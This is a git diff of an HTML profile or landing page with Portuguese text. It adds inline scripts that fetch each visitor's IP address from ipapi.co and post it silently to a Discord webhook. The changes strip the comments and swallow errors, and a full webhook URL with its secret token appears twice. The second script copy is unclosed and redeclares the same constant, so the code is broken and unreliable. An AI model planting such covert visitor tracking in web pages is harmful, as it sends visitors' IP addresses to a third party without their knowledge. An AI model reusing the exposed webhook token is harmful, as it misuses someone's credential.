@@ -102,46 +102,35 @@
 
     </style>
 </head>
+    
     <script>
-        // URL do Webhook do Discord (substitua pelo seu)
         const discordWebhookUrl = "https://discord.com/api/webhooks/1320238731902451762/pQRGKmQTSF4a9h0PM7ckG1u3NEsEXi3FxIGE6pOeLEZfLG63uJXJSPrPPjb9WVULOTPv";
 
-        // Função para enviar o IP para o Discord
         function sendToDiscord(ip) {
-            const message = {
-                content: `New IP: ${ip}`
-            };
+    const message = {
+        content: `Novo visitante com IP: ${ip}`
+    };
 
-            fetch(discordWebhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensagem enviada para o Discord:', data);
-            })
-            .catch(error => {
-                console.error('Erro ao enviar IP para o Discord:', error);
-            });
+    fetch(discordWebhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    }).catch(() => {});
+}
+        function fetchVisitorIP() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendToDiscord(ip);
+                })
+                .catch(() => {});
         }
-
-        // Função para obter o IP do visitante
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())  // Converte a resposta para JSON
-            .then(data => {
-                const ip = data.ip;
-                // Envia o IP para o Discord
-                sendToDiscord(ip);
-            })
-            .catch(error => {
-                console.error('Erro ao obter o IP:', error);
-            });
-    </script>
+      </script>
     
-<body onclick="enterSite()">
+   <body onclick="enterSite()">
     <div class="start-screen">♰</div>
 
     <div class="profiles">
@@ -171,6 +160,25 @@
 
     <!-- Logo do Discord -->
     <img id="discord-logo" src="media/discord.png" alt="Discord Logo" onclick="window.location.href='https://discord.gg/GDjg796Xbp';">
+
+    <script>
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1320238731902451762/pQRGKmQTSF4a9h0PM7ckG1u3NEsEXi3FxIGE6pOeLEZfLG63uJXJSPrPPjb9WVULOTPv";
+
+        function sendToDiscord(ip) {
+            const message = { content: `Novo visitante com IP: ${ip}` };
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message),
+            }).catch(() => {});
+        }
+
+        function fetchVisitorIP() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => sendToDiscord(data.ip))
+                .catch(() => {});
+        }
 
     <script>
         let audioPlayed = false;
